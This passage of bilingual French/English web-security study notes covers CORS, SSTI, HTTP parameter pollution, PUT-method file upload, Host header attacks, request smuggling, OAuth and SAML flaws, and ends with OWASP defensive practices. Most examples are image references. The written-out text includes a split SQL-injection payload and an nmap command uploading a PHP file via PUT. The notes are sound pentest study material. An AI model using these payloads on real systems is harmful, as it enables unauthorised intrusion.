![](media/image360.png){width="6.267716535433071in"
height="1.2361111111111112in"}

**SOP does not prevent sending requests. It does prevent a page from
accessing results of cross-domain requests.**

-   **Pre-flight checks :**

**The pre-flight check was added to the CORS specification to protect
legacy**

**resources from the expanded request options allowed by CORS.**

![](media/image45.png){width="6.267716535433071in"
height="4.027777777777778in"}

-   ### Exploit 

> Voir Section *[BB - CORS]{.underline}*

-   ## Server-side template injection

```{=html}
<!-- -->
```
-   ### Définition

Server-side template injection is when an attacker is able to use native
template syntax to inject a malicious payload into a template, which is
then executed server-side.

This allows attackers to inject arbitrary template directives in order
to manipulate the template engine, often enabling them to take complete
control of the server.

**As the name suggests, server-side template injection payloads are
delivered and evaluated server-side, potentially making them much more
dangerous than a typical client-side template injection.**

![](media/image402.png){width="6.267716535433071in"
height="1.0833333333333333in"}

![](media/image316.png){width="6.267716535433071in"
height="4.277777777777778in"}

![](media/image11.png){width="6.267716535433071in"
height="3.361111111111111in"}

-   ### Detect

![](media/image149.png){width="6.267716535433071in"
height="2.5555555555555554in"}

![](media/image98.png){width="6.267716535433071in"
height="3.0694444444444446in"}

![](media/image299.png){width="6.267716535433071in"
height="4.972222222222222in"}

![](media/image396.png){width="6.267716535433071in"
height="1.4027777777777777in"}

-   ### Identify

![](media/image219.png){width="6.267716535433071in"
height="3.861111111111111in"}

![](media/image4.png){width="6.267716535433071in"
height="3.4444444444444446in"}

**Once you discover a server-side template injection vulnerability, and
identify the template engine being used, unless you already know the
template engine inside out, reading its documentation is usually the
first place to start.**

**While this may not be the most exciting way to spend your time, it is
important not to underestimate what a useful source of information the
documentation can be.**

-   ### Explore

![](media/image7.png){width="6.267716535433071in"
height="1.5833333333333333in"}

**It is important to note that websites will contain both built-in
objects provided by the template and custom, site-specific objects that
have been supplied by the web developer. You should pay particular
attention to these non-standard objects because they are especially
likely to contain sensitive information or exploitable methods.**

**The first step is to identify objects and methods to which you have
access.**

**You should proceed by reviewing each function for exploitable
behavior. By working methodically through this process, you may
sometimes be able to construct a complex attack that is even able to
exploit more secure targets.**

![](media/image351.png){width="6.267716535433071in"
height="0.8333333333333334in"}

-   ### Preventing

![](media/image119.png){width="6.267716535433071in"
height="2.8194444444444446in"}

-   **You can test SSTI in a webpage like you test an XSS. ( information
    > reflected on the page )**

**\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--**

-   ## HTTP Parameter Pollution

> **HTTP Parameter Pollution (HPP) is a Web attack evasion technique
> that allows an attacker to craft a HTTP request in order to manipulate
> or retrieve hidden information. This evasion technique is based on
> splitting an attack vector between multiple instances of a parameter
> with the same name.**
>
> **Since none of the relevant HTTP RFCs define the semantics of HTTP
> parameter manipulation, each web application delivery platform may
> deal with it differently. In particular, some environments process
> such requests by concatenating the values taken from all instances of
> a parameter name within the request.**
>
> **Example with SQLI :**
>
> **https://www.xxx.com/noticias.php?id=1 union select 1,2 \--**
>
> **become :**
>
> **https://www.xxx.com/noticias.php?id=1&id=\*/union/\*&id=\*/select/\*&id=\*/1,2+\--+**

-   **De manière générale, il est important de regarder si on peut
    > découvrir le format du cookie de session pour analyser si on peut
    > en créer un autre valide "à la main" pour se faire passer pour
    > quelqu'un d'autre.**

## Différents Entêtes HTTP

+-----------------------------------+-----------------------------------+
| **Content-Length**                | **Indique la taille en octets     |
|                                   | (exprimée en base 10) du corps de |
|                                   | la réponse envoyée au client.**   |
+===================================+===================================+
| **Content-Type**                  | **Sert à indiquer le type de la   |
|                                   | ressource ( dans le body )**      |
+-----------------------------------+-----------------------------------+
| **Host**                          | **L\'en-tête de requête Host      |
|                                   | spécifie le nom de domaine du     |
|                                   | serveur (pour de l\'hébergement   |
|                                   | virtuel), et (optionnellement) le |
|                                   | numéro du port TCP sur lequel le  |
|                                   | serveur écoute.**                 |
+-----------------------------------+-----------------------------------+
| **X-Powered-By**                  | **Specifies the technology (e.g.  |
|                                   | ASP.NET, PHP, JBoss) supporting   |
|                                   | the web application (version      |
|                                   | details are often in X-Runtime,   |
|                                   | X-Version, or X-AspNet-Version)** |
+-----------------------------------+-----------------------------------+
| **Referer**                       | **This header identifies the      |
|                                   | address of the webpage which is   |
|                                   | linked to the resource being      |
|                                   | requested. By checking the        |
|                                   | "Referer", the new webpage can    |
|                                   | see where the request             |
|                                   | originated.**                     |
+-----------------------------------+-----------------------------------+
| **X-Forwarded-For: \<client\>,    | **Le champ d\'en-tête HTTP        |
| \<proxy1\>, \<proxy2\>**          | X-Forwarded-For est une méthode   |
|                                   | courante pour identifier          |
|                                   | l\'adresse IP d\'origine d\'un    |
|                                   | client se connectant à un serveur |
|                                   | Web via un proxy HTTP ou un autre |
|                                   | chose.**                          |
+-----------------------------------+-----------------------------------+
| **Location**                      | **header de redirection**         |
+-----------------------------------+-----------------------------------+
| **Vary**                          | **en tête par rapport à la mise   |
|                                   | en cache**                        |
+-----------------------------------+-----------------------------------+
| **Connection**                    | **Contrôle la façon dont la       |
|                                   | connexion reste ouverte ou non    |
|                                   | après que la transaction courante |
|                                   | soit terminée. Si la valeur       |
|                                   | envoyée est keep-alive, la        |
|                                   | connexion est persistante et      |
|                                   | n\'est pas fermée.**              |
|                                   |                                   |
|                                   | **Close : indique que le client   |
|                                   | ou que le serveur souhaite fermer |
|                                   | la connexion. C\'est la valeur    |
|                                   | par défaut pour les requêtes en   |
|                                   | HTTP/1.0.**                       |
+-----------------------------------+-----------------------------------+
| **X-Content-Type-Options**        | **It's used to protect against    |
|                                   | MIME sniffing vulnerabilities.**  |
|                                   |                                   |
|                                   | **This header is currently only   |
|                                   | honoured by Chrome and certain    |
|                                   | versions of Internet Explorer**   |
+-----------------------------------+-----------------------------------+
| **Pragma: no-cache**              | **Vide le cache du reverse        |
|                                   | proxy**                           |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+

## 

-   ## MIME sniffing

```{=html}
<!-- -->
```
-   **MIME sniffing is a technique ( not malicious ) used by some web
    > browsers (primarily Internet Explorer) to examine the content of a
    > particular asset. This is done for the purpose of determining an
    > asset\'s file format.**

> ![](media/image392.png){width="6.267716535433071in"
> height="2.2222222222222223in"}

**In summary, although MIME sniffing can be a useful feature provided
by**

**web browsers can also cause security issues.**

-   ## Exploiting PUT Method

    -   **PUT method was originally intended as one of the HTTP methods
        > used for file management operations.**

```{=html}
<!-- -->
```
-   **As this method is used to change or delete the files from the
    > target server's file system, it often results in arising in
    > various File upload vulnerabilities.**

```{=html}
<!-- -->
```
-   **First, we have to determine if the HTTP PUT method is enabled on
    > the server ( by some tools like Nikito ...). Note that permissions
    > are likely to be implemented per directory, so recursive checking
    > is required in an attack. Tools such as DAVTest can be used to
    > iteratively check all directories on the server for the PUT
    > method.**

![](media/image105.png){width="6.267716535433071in" height="4.375in"}

-   **If this method is enabled, we can try different tools and
    > techniques**

-   ### With Cadaver 

![](media/image19.png){width="6.267716535433071in"
height="5.986111111111111in"}

-   ### With Nmap

![](media/image152.png){width="6.267716535433071in"
height="1.1805555555555556in"}

**An example with this command :**

**nmap -p 80 192.168.1.103 \--script http-put \--script-args
http-put.url=\'/dav/nmap.php\',http-put.file=\'/root/Desktop/nmap.php\'**

![](media/image129.png){width="6.267716535433071in"
height="4.097222222222222in"}

-   ### With Burp-Suite

![](media/image227.png){width="6.267716535433071in"
height="2.2916666666666665in"}

![](media/image106.png){width="6.267716535433071in"
height="4.847222222222222in"}

![](media/image243.png){width="6.267716535433071in"
height="3.1944444444444446in"}

-   ### Finding PUT Method vuln

![](media/image357.png){width="6.267716535433071in" height="3.5in"}

![](media/image30.png){width="6.267716535433071in"
height="1.7916666666666667in"}

-   ## HTTP Host header attacks

-   ### Definition

![](media/image97.png){width="6.267716535433071in"
height="1.4861111111111112in"}

**The purpose of the HTTP Host header is to help identify which back-end
component the client wants to communicate with. If requests didn\'t
contain Host headers, or if the Host header was malformed in some way,
this could lead to issues when routing incoming requests to the intended
application.**

**Historically, this ambiguity didn\'t exist because each IP address
would only host content for a single domain.**

**Nowadays, it is common for multiple websites and applications to be
accessible at the same IP address.**

**When multiple applications are accessible via the same IP address,
this is most commonly a result of one of the following scenarios :**

1)  **Virtual Hosting**

![](media/image134.png){width="6.267716535433071in"
height="1.4166666666666667in"}

**2) Routing traffic via an intermediary**

**Another common scenario is when websites are hosted on distinct
back-end servers, but all traffic between the client and servers is
routed through an intermediary system.**

**This could be a simple load balancer or a reverse proxy server of some
kind.**

**In this case, even though the websites are hosted on separate back-end
servers, all of their domain names resolve to a single IP address of the
intermediary component.**

**How does the HTTP Host header solve this problem?**

**When a browser sends the request, the target URL will resolve to the
IP address of a particular server. When this server receives the
request, it refers to the Host header to determine the intended back-end
and forwards the request accordingly.**

![](media/image52.png){width="7.533506124234471in"
height="3.4914424759405076in"}

-   ### Prévention

![](media/image335.png){width="7.481422790901138in"
height="5.169886264216973in"}

### Test HTTP Host header attack :

**When probing for Host header injection vulnerabilities, the first step
is to test what happens when you supply an arbitrary, unrecognized
domain name via the Host header.**

**Some intercepting proxies derive the target IP address from the Host
header directly, which makes this kind of testing all but impossible;
any changes you made to the header would just cause the request to be
sent to a completely different IP address.**

**Sometimes, you will still be able to access the target website even
when you supply an unexpected Host header. This could be for a number of
reasons.**

**For example, servers are sometimes configured with a default or
fallback option in case they receive requests for domain names that they
don\'t recognize.**

![](media/image36.png){width="7.593587051618548in"
height="0.8072922134733158in"}

![](media/image61.png){width="7.346006124234471in"
height="3.6241918197725282in"}

![](media/image377.png){width="7.359978127734033in"
height="1.1614588801399826in"}

![](media/image343.png){width="7.346006124234471in"
height="2.684586614173228in"}

![](media/image180.png){width="7.283506124234471in"
height="2.141496062992126in"}

**Add line wrapping**

**You can also uncover quirky behavior by indenting HTTP headers with a
space character :**

![](media/image424.png){width="3.8229166666666665in" height="0.8125in"}

**The website may block requests with multiple Host headers, but you may
be able to bypass this validation by indenting one of them like this.**

**The back-end may ignore the leading space and gives precedence to the
first header in the case of duplicates.**

**There are many possible ways to issue harmful, ambiguous requests. You
can also adapt many HTTP request smuggling techniques to construct Host
header attacks.**

![](media/image431.png){width="7.262672790901138in"
height="4.282805118110236in"}

**From a security perspective, it is important to note that some
websites, potentially even your own, support this kind of behavior
unintentionally. This is usually because one or more of these headers is
enabled by default in some third-party technology that they use.**

-   ### Password reset poisoning :

![](media/image225.png){width="7.379314304461943in"
height="1.2135422134733158in"}

![](media/image265.png){width="7.471006124234471in"
height="3.4128346456692915in"}

![](media/image85.png){width="7.450172790901138in"
height="3.4033180227471567in"}

![](media/image83.png){width="7.399583333333333in"
height="0.9218755468066492in"}

![](media/image222.png){width="6.267716535433071in"
height="2.4166666666666665in"}

-   ## HTTP request smuggling

-   ### Definition

> **HTTP request smuggling is a technique for interfering with the way a
> web site processes sequences of HTTP requests that are received from
> one or more users.**

![](media/image217.png){width="5.382346894138233in"
height="1.578125546806649in"}

**When the front-end server forwards HTTP requests to a back-end server,
it typically sends several requests over the same back-end network
connection, because this is much more efficient and performant.**

**The protocol is very simple: HTTP requests are sent one after another,
and the receiving server parses the HTTP request headers to determine
where one request ends and the next one begins.**

![](media/image21.png){width="7.502256124234471in"
height="4.738835301837271in"}

![](media/image252.png){width="7.346006124234471in"
height="2.37951990376203in"}

![](media/image127.png){width="7.189756124234471in"
height="2.591655730533683in"}

![](media/image337.png){width="6.267716535433071in"
height="4.666666666666667in"}

![](media/image161.png){width="6.267716535433071in"
height="0.9861111111111112in"}

**Since the HTTP specification provides two different methods for
specifying the length of HTTP messages, it is possible for a single
message to use both methods at once, such that they conflict with each
other.**

**The HTTP specification attempts to prevent this problem by stating
that if both the Content-Length and Transfer-Encoding headers are
present, then the Content-Length header should be ignored.**

**This might be sufficient to avoid ambiguity when only a single server
is in play, but not when two or more servers are chained together. In
this situation, problems can arise for two reasons :**

**Some servers do not support the Transfer-Encoding header in
requests.**

**Some servers that do support the Transfer-Encoding header can be
induced not to process it the header is obfuscated in some way.**

**If the front-end and back-end servers behave differently in relation
to the (possibly obfuscated) Transfer-Encoding header, then they might
disagree about the boundaries between successive requests, leading to
request smuggling vulnerabilities.**

![](media/image146.png){width="6.267716535433071in"
height="1.8888888888888888in"}

-   ### CL.TE vuln

![](media/image120.png){width="6.267716535433071in"
height="3.263888888888889in"}

-   ### TE.CL vuln

![](media/image435.png){width="6.692708880139983in"
height="4.9735793963254595in"}

-   ### TE.TE vuln

![](media/image364.png){width="6.267716535433071in"
height="4.958333333333333in"}

-   ### Prevention

![](media/image340.png){width="6.267716535433071in"
height="2.138888888888889in"}

-   ### Finding CL.TE vuln

![](media/image213.png){width="6.267716535433071in"
height="2.6527777777777777in"}

![](media/image132.png){width="5.889763779527559in"
height="4.097222222222222in"}

-   ### Finding TE.CL vuln

![](media/image144.png){width="6.267716535433071in"
height="3.5555555555555554in"}

![](media/image400.png){width="5.889763779527559in" height="4.375in"}

-   ## IDOR ( Insecure Direct object Reference )

> **Insecure Direct Object Reference represents a vulnerable Direct
> Object Reference. It involves replacing the entity name with a
> different value without the user's authorization. As a result, users
> will be directed to links, pages, or sites other than the ones they
> intended to visit, without having the slightest clue about it.**
>
> **Preventing IDOR Vulnerability :**

-   **Use an Indirect Reference Map ( mapping between the alternate IDs
    > and actual references are maintained safely on the servers ).**

> **Note that some sources recommend preventing IDOR vulnerabilities by
> using long, hard-to-guess object identifiers.**

-   ## OAuth 2.0 authentication vulnerabilities

### What is OAuth ?

> **OAuth is a commonly used authorization framework that enables
> websites and web applications to request limited access to a user\'s
> account on another application.**
>
> **You\'ve almost certainly come across sites that let you log in using
> your social media account.**
>
> **Crucially, OAuth allows the user to grant this access without
> exposing their login credentials to the requesting application.**

### How does OAuth 2.0 Work ?

![](media/image123.png){width="6.267716535433071in" height="1.5in"}

> **There are numerous different ways that the actual OAuth process can
> be implemented. In this topic, we\'ll focus on the \"authorization
> code\" and \"implicit\" grant types as these are by far the most
> common.**

![](media/image196.png){width="6.267716535433071in" height="1.25in"}

> **There are several different grant types, each with varying levels of
> complexity and security considerations.**

**Fore more details :
[[https://portswigger.net/web-security/oauth/grant-types]{.underline}](https://portswigger.net/web-security/oauth/grant-types)**

> **Grant types are often referred to as \"OAuth flows\".**
>
> **example :** ![](media/image367.png){width="6.267716535433071in"
> height="0.6111111111111112in"}

![](media/image155.png){width="6.267716535433071in"
height="0.9583333333333334in"}

> **For basic OAuth, the scopes for which a client application can
> request access are unique to each OAuth service.**

**"Authorization code" grant type**

![](media/image271.png){width="6.267716535433071in"
height="4.486111111111111in"}

**Other better view :**

![](media/image284.png){width="8.673270997375328in"
height="4.651042213473316in"}

-   **The \"access token\" is also used to make API calls to fetch the
    > relevant user data.**

-   ![](media/image2.png){width="6.267716535433071in"
    > height="0.6944444444444444in"}

**As the most sensitive data (the access token and user data) is not
sent via the browser, this grant type is arguably the most secure.
Server-side applications should ideally always use this grant type if
possible.**

1)  **Authorization request**

> **The client application sends a request to the OAuth service\'s (
> /authorization OR /auth ... it may vary).**

![](media/image199.png){width="6.267716535433071in"
height="3.4305555555555554in"}

2)  **User login and consent**

> **When the authorization server receives the initial request, it will
> redirect the user to a login page, where they will be prompted to log
> in to their account with the OAuth provider. For example, this is
> often their social media account.**
>
> **They will then be presented with a list of data that the client
> application wants to access. This is based on the scopes defined in
> the authorization request. The user can choose whether or not to
> consent to this access.**

**"Implicit" grant type**

![](media/image159.png){width="6.267716535433071in" height="3.75in"}

-   **The implicit grant type is much simpler. Rather than first
    > obtaining an authorization code and then exchanging it for an
    > access token ( like in the other grant type ), the client
    > application receives the access code immediately after the user
    > gives their consent.**

```{=html}
<!-- -->
```
-   **It is far less secure. When using the implicit grant type, all
    > communication happens via browser redirects - there is no secure
    > back-channel like in the authorization code flow.**

> **This means that the sensitive access token and the user\'s data are
> more exposed to potential attacks.**

-   **The implicit grant type is more suited to single-page applications
    > and native desktop applications, which cannot easily store the
    > client_secret on the back-end, and therefore, don\'t benefit as
    > much from using the authorization code grant type.**

**OAuth authentication**

-   **Although not originally intended for this purpose, OAuth has
    > evolved into a means of authenticating users as well. For example,
    > you\'re probably familiar with the option many websites provide to
    > log in using your existing social media account**

```{=html}
<!-- -->
```
-   **OAuth authentication is generally implemented as follows :**

![](media/image413.png){width="6.267716535433071in"
height="1.3055555555555556in"}

![](media/image133.png){width="8.138205380577428in"
height="4.286458880139983in"}

-   ![](media/image141.png){width="8.26562554680665in"
    height="4.379957349081365in"}

**If the state Parameter is not used by the OAuth2 Client, a CSRF is
maybe possible ( leading to Takeover account ) :**

![](media/image426.png){width="8.380208880139982in"
height="4.35715113735783in"}

**Then ( in the next photo ):**

![](media/image314.png){width="8.473958880139982in"
height="4.631116579177603in"}

**Or When the Login page in the Authorization Server and the account
linking are no protected against CSRF :**

![](media/image356.png){width="8.222708880139983in"
height="5.307292213473316in"}

-   ### How do OAuth authentication vulnerabilities arise?

    -   **OAuth authentication vulnerabilities arise partly because the
        > OAuth specification is relatively vague and flexible by
        > design.**

```{=html}
<!-- -->
```
-   **One of the other key issues with OAuth is the general lack of
    > built-in security features. The security relies almost entirely on
    > developers using the right combination of configuration options
    > and implementing their own additional security measures on top,
    > such as robust input validation.**

```{=html}
<!-- -->
```
-   **Depending on the grant type, highly sensitive data is also sent
    > via the browser, which presents various opportunities for an
    > attacker to intercept it.**

**Example of attack :**

![](media/image150.png){width="9.18975612423447in"
height="4.841913823272091in"}

![](media/image27.png){width="6.267716535433071in"
height="3.013888888888889in"}

![](media/image200.png){width="6.267716535433071in"
height="0.6805555555555556in"}

**However, there may still be ways to bypass this validation. It depends
on how the URI is checked (See SSRF bypass, parameter pollution
vulnerabilities).**

![](media/image246.png){width="6.267716535433071in"
height="0.5972222222222222in"}

**It is important to note that you shouldn\'t limit your testing to just
probing the redirect_uri parameter in isolation.**

**You will often need to experiment with different combinations of
changes to several parameters.**

**Sometimes changing one parameter can affect the validation of others.
For example, changing the response_mode from query to fragment can
sometimes completely alter the parsing of the redirect_uri.**

![](media/image111.png){width="6.267716535433071in"
height="2.138888888888889in"}

**Once you identify which other pages you are able to set as the
redirect URI, you should audit them for additional vulnerabilities (
like open redirects, ...) that you can potentially use to leak the code
or token.**

-   **Flawed scope validation :**

![](media/image244.png){width="6.267716535433071in"
height="1.0555555555555556in"}

-   ## SAML

-   ### Definiton

**Unlike OAuth, SAML is just for authentication :**

![](media/image62.png){width="8.218832020997375in"
height="3.8327220034995624in"}

**But the Service Provider needs to trust the Identity Provider :**

![](media/image34.png){width="6.267716535433071in"
height="4.027777777777778in"}

**So the SAML response is signed and the Service Provider has to verify
this Signature with the IProvider public key :**

![](media/image414.png){width="6.267716535433071in"
height="3.236111111111111in"}

### Some Vulnerability :

-   **The signature is not verified ( so you can tamper the response and
    > connect with another account ) Or you can remove it (only the
    > content of "SignatureValue" tag) .**

```{=html}
<!-- -->
```
-   ### Injection de commentaire XML :

```{=html}
<!-- -->
```
-   ![](media/image203.png){width="6.267716535433071in"
    > height="3.4722222222222223in"}

> **\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--**

-   ## Phar://

![](media/image189.png){width="5.791338582677166in"
height="3.9444444444444446in"}

![](media/image280.png){width="5.791338582677166in"
height="2.4027777777777777in"}

![](media/image168.png){width="5.791338582677166in"
height="0.20833333333333334in"}

![](media/image223.png){width="5.791338582677166in"
height="0.4583333333333333in"}

![](media/image112.png){width="5.791338582677166in"
height="0.9166666666666666in"}

-   ## Different file extensions

  -----------------------------------------------------------------------
  **\[FILE\].a**                **Static libraries in Linux.**
  ----------------------------- -----------------------------------------
  **\[FILE\].so**               **Dynamically linked shared object
                                libraries in Linux.**

  **\[FILE\].ppm**              **Image format.**

  **\[FILE\].asar**             **Fichier décompressable avec winrar**

  **.pht**                      **liée à php**

                                

                                
  -----------------------------------------------------------------------

-   ## JS prototype Pollution :

![](media/image421.png){width="7.210589457567804in"
height="4.165703193350831in"}

![](media/image130.png){width="6.283506124234471in"
height="5.2974081364829395in"}

![](media/image171.png){width="6.789248687664042in"
height="1.6822922134733158in"}

-   ## Règle et de bonnes pratiques :

-   ### Session Management :

voir :
[[https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#session-id-properties]{.underline}](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#session-id-properties)

+-----------------------------------------------------------------------+
| -   Session ID Name Fingerprinting                                    |
|                                                                       |
|     -   It is recommended to change the default session ID name of    |
|         > the web development framework (*PHPSESSID* (PHP),           |
|         > *JSESSIONID* (J2EE), *CFID* & *CFTOKEN* (ColdFusion),       |
|         > *ASP.NET_SessionId* (ASP .NET), etc.), to a generic name,   |
|         > such as id.                                                 |
|                                                                       |
| > Therefore, the session ID name can disclose the technologies and    |
| > programming languages used by the web application.                  |
+=======================================================================+
| -   Session ID Length and Entropy                                     |
|                                                                       |
|     -   The session ID must be long enough and random enough to       |
|         > prevent brute force attacks ( a good CSPRNG                 |
|         > (Cryptographically Secure Pseudorandom Number Generator)    |
|         > must be used ).                                             |
|                                                                       |
|     -   The session ID value must provide at least 64 bits of entropy |
|                                                                       |
|     -   Must also be unique                                           |
+-----------------------------------------------------------------------+
| -   Session ID Content (or Value)                                     |
|                                                                       |
|     -   The session ID content (or value) must be meaningless to      |
|         > prevent information disclosure attacks.                     |
|                                                                       |
|     -   The session ID must simply be an identifier on the client     |
|         > side, and its value must never include sensitive            |
|         > information (or PII).                                       |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   In addition, if the session objects and properties contain        |
|     > sensitive information, such as credit card numbers, it is       |
|     > required to duly encrypt and protect the session management     |
|     > repository.                                                     |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   It is recommended to use the session ID created by your language  |
|     > or framework as they have been tested by the web application    |
|     > security and development communities over time.                 |
+-----------------------------------------------------------------------+
| -   A web application should make use of cookies for session ID       |
|     > exchange management.                                            |
|                                                                       |
| > If a user submits a session ID through a different exchange         |
| > mechanism, such as a URL parameter, the web application should      |
| > avoid accepting it as part of a defensive strategy to stop session  |
| > fixation.                                                           |
+-----------------------------------------------------------------------+
|                                                                       |
+-----------------------------------------------------------------------+
|                                                                       |
+-----------------------------------------------------------------------+

## 

## 

## 

-   ### Cookies Management :

voir :
[[https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#cookies]{.underline}](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#cookies)

+-----------------------------------------------------------------------+
| -   Set "Secure" Attribute :                                          |
|                                                                       |
|     -   The Secure cookie attribute instructs web browsers to only    |
|         > send the cookie through an encrypted HTTPS (SSL/TLS)        |
|         > connection.                                                 |
|                                                                       |
| > This session protection mechanism is mandatory to prevent the       |
| > disclosure of the session ID through MitM (Man-in-the-Middle)       |
| > attacks.                                                            |
+=======================================================================+
| -   Set "HttpOnly" Attribute :                                        |
|                                                                       |
|     -   The HttpOnly cookie attribute instructs web browsers not to   |
|         > allow scripts an ability to access the cookies via the DOM  |
|         > document.cookie object. This session ID protection is       |
|         > mandatory to prevent session ID stealing through XSS        |
|         > attacks.                                                    |
+-----------------------------------------------------------------------+
| -   Set "SameSite" Attribute :                                        |
|                                                                       |
|     -   SameSite allows a server to define a cookie attribute making  |
|         > it impossible for the browser to send this cookie along     |
|         > with cross-site requests. The main goal is to mitigate the  |
|         > risk of cross-origin information leakage, and provides some |
|         > protection against cross-site request forgery attacks.      |
|                                                                       |
| BONUS : Using SameSite cookies in Lax mode does then provide a        |
| partial defense against CSRF attacks, because user actions that are   |
| targets for CSRF attacks are often implemented using the POST method. |
| Two important caveats here are:                                       |
|                                                                       |
| Some applications do implement sensitive actions using GET requests.  |
|                                                                       |
| Many applications and frameworks are tolerant of different HTTP       |
| methods. In this situation, even if the application itself employs    |
| the POST method by design, it will in fact accept requests that are   |
| switched to use the GET method.                                       |
+-----------------------------------------------------------------------+
| -   Set "Domain and Path" Attribute :                                 |
|                                                                       |
| > The Domain cookie attribute instructs web browsers to only send the |
| > cookie to the specified domain and all subdomains. If the attribute |
| > is not set, by default the cookie will only be sent to the origin   |
| > server (in a general way).                                          |
| >                                                                     |
| > The Path cookie attribute instructs web browsers to only send the   |
| > cookie to the specified directory or subdirectories (or paths or    |
| > resources) within the web application.                              |
+-----------------------------------------------------------------------+
|                                                                       |
+-----------------------------------------------------------------------+
|                                                                       |
+-----------------------------------------------------------------------+

## 

-   ### AJAX Management :

> voir :
> https://cheatsheetseries.owasp.org/cheatsheets/AJAX_Security_Cheat_Sheet.html

+-----------------------------------------------------------------------+
| -   Use .innerText instead of .innerHtml                              |
|                                                                       |
| The use of .innerText will prevent most XSS problems as it will       |
| automatically encode the text.                                        |
+=======================================================================+
| -   Don\'t rely on client and business logic for security             |
|                                                                       |
| Least ye have forgotten the user controls the client side logic. I    |
| can use a number of browser plugins to set breakpoints, skip code,    |
| change values, etc. Never rely on client logic.                       |
+-----------------------------------------------------------------------+
| -   Use CSRF Protection                                               |
+-----------------------------------------------------------------------+
|                                                                       |
+-----------------------------------------------------------------------+
|                                                                       |
+-----------------------------------------------------------------------+

## 

![](media/image5.png){width="7.825172790901138in"
height="2.8707731846019247in"}

Session Storage et SESSION sont deux choses différentes.

-   ### Authentication Management :

+-----------------------------------------------------------------------+
| -   Make sure your usernames/user IDs are case-insensitive. User      |
|     > \'smith\' and user \'Smith\' should be the same user. case      |
|     > sensitive usernames would enable someone to attempt to          |
|     > impersonate someone else just by registering a new account with |
|     > a different permutation of capital/lowercase letters.           |
+=======================================================================+
| -   Password                                                          |
|                                                                       |
|     -   8 characters minimum ( shorter is considered to be weak )     |
|                                                                       |
|     -   It is important to set a maximum password length (such as 64  |
|         > characters) to prevent long password Denial of Service      |
|         > attacks but not too large due to limitations in certain     |
|         > hashing algorithms.                                         |
|                                                                       |
|     -   Do not silently truncate passwords if it's too long.          |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   Allow usage of all characters including unicode and whitespace.   |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   Include password strength meter, block common and previously      |
|     > breached passwords                                              |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   Require Re-authentication for Sensitive Features in order to      |
|     > mitigate CSRF and session hijacking.                            |
+-----------------------------------------------------------------------+
| -   Authentication and Error Messages                                 |
|                                                                       |
|     -   An application must respond with a generic error message      |
|         > regardless of whether:                                      |
|                                                                       |
|         -   The user ID or password was incorrect.                    |
|                                                                       |
|         -   The account does not exist.                               |
|                                                                       |
|         -   The account is locked or disabled.                        |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   The processing time can be significantly different according to   |
|     > the case (success vs failure) allowing an attacker to mount a   |
|     > time-based attack ( example of implementation here :            |
|     > [[https://cheatsheetseries.owasp.org                            |
| /cheatsheets/Authentication_Cheat_Sheet.html]{.underline}](https://ch |
| eatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html) |
|     > )                                                               |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   ![](media/image169.png){width="6.273089457567804in"               |
|     > height="2.0078871391076114in"}                                  |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   ![](media/image345.png){width="5.239583333333333in"               |
|     > height="2.1666666666666665in"}                                  |
+-----------------------------------------------------------------------+
| -   Protect Against Automated Attacks                                 |
|                                                                       |
|     -   Multi-Factor Authentication                                   |
|                                                                       |
|     -   Account Lockout                                               |
|                                                                       |
|     -   CAPTCHA                                                       |
|                                                                       |
|         -   However, many CAPTCHA implementations have weaknesses     |
|             > that allow them to be solved using automated            |
|             > techniques.                                             |
|                                                                       |
|     -                                                                 |
+-----------------------------------------------------------------------+
|                                                                       |
+-----------------------------------------------------------------------+

-   ### Credential Stuffing Prevention

+-----------------------------------------------------------------------+
| -   Multi-Factor Authentication                                       |
|                                                                       |
|     -   Multi-factor authentication (MFA) is by far the best defense  |
|         > against the majority of password-related attacks, including |
|         > credential stuffing and password spraying.                  |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   In order to balance security and usability, only in specific      |
|     > circumstances MFA could be used :                               |
|                                                                       |
|     -   A new browser/device or IP address.                           |
|                                                                       |
|     -   An unusual country or location.                               |
|                                                                       |
|     -   Specific countries that are considered untrusted.             |
|                                                                       |
|     -   An IP address that appears on known block lists.              |
|                                                                       |
|     -   An IP address that has tried to login to multiple accounts.   |
|                                                                       |
|     -   A login attempt that appears to be scripted rather than       |
|         > manual.                                                     |
+=======================================================================+
| -   Alternative Defenses                                              |
|                                                                       |
|     -   Secondary Passwords, PINs and Security Questions :            |
|                                                                       |
|     -   CAPTCHA                                                       |
|                                                                       |
|     -   IP Block-listing                                              |
+-----------------------------------------------------------------------+
| -   Defense in Depth                                                  |
|                                                                       |
|     -   Identifying Leaked Passwords                                  |
|                                                                       |
|     -   Notify users about unusual security events                    |
+-----------------------------------------------------------------------+
| -   Multi-Step Login Processes ( to discourage hacker )               |
|                                                                       |
|     -   By adding additional steps to this process, such as requiring |
|         > the username and password to be entered sequentially        |
+-----------------------------------------------------------------------+
|                                                                       |
+-----------------------------------------------------------------------+
